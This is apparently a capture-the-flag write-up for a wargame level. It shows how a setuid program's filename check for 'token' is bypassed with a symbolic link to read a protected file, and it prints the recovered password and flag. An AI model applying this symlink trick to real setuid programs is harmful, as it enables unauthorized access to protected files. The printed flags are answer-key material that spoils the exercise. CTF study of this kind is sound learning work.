@@ -1,0 +1,44 @@
+## FLAG: `fiumuikeil55xe9cu4dood66h`
+
+> ls -l
+```
+    -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+    -rw-------  1 flag08 flag08    26 Mar  5  2016 token
+```
+
+> ./level08
+```
+    ./level08 [file to read]
+```
+
+> ./level08 token
+```
+    You may not access 'token'
+```
+
+> echo 'pwd' > /tmp/test && ./level08 /tmp/test
+    -> print content
+
+> ltrace ./level08 /tmp/test
+```
+    __libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
+    strstr("/tmp/test", "token")                                                                                                                                                                     = NULL
+    open("/tmp/test", 0, 014435162522)                                                                                                                                                               = 3
+    read(3, "pwd\n", 1024)                                                                                                                                                                           = 4
+    write(1, "pwd\n", 4pwd
+    )                                                                                                                                                                             = 4
+    +++ exited (status 4) +++
+```
+## `strstr("/tmp/test", "token")` This program must only check that there is no substring `token` in the filename
+
+## We'll use symbolic link to bypass this
+> ln -s /home/user/level08/token /tmp/08_link && ./level08 /tmp/08_link
+```
+    quif5eloekouj29ke0vouxean
+```
+
+> su flag08
+> getflag
+```
+    Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+```
